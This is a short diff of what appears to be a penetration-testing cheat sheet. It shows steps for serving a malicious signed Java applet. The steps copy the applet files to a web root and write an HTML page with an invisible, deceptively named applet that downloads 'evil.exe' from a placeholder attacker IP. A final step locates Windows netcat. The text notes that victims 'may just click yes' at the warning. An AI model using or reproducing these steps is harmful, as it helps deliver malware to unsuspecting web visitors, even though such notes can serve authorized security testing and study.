@@ -13,7 +13,7 @@ Will give warning message but users may just click yes
 
 6. Copy the files to your web root `cp Java.class SignedJava.jar /var/www`
 
-7. Then create a html file to serve your applet `echo	'<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param	name="1" value="http://YO.UR.IP.ADR:80/evil.exe"></applet>' > /var/www/java.html`
+7. Then create a html file to serve your applet `echo	'<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://YO.UR.IP.ADR:80/evil.exe"></applet>' > /var/www/java.html`
 
 8. Find windows nc `locate nc.exe`
 
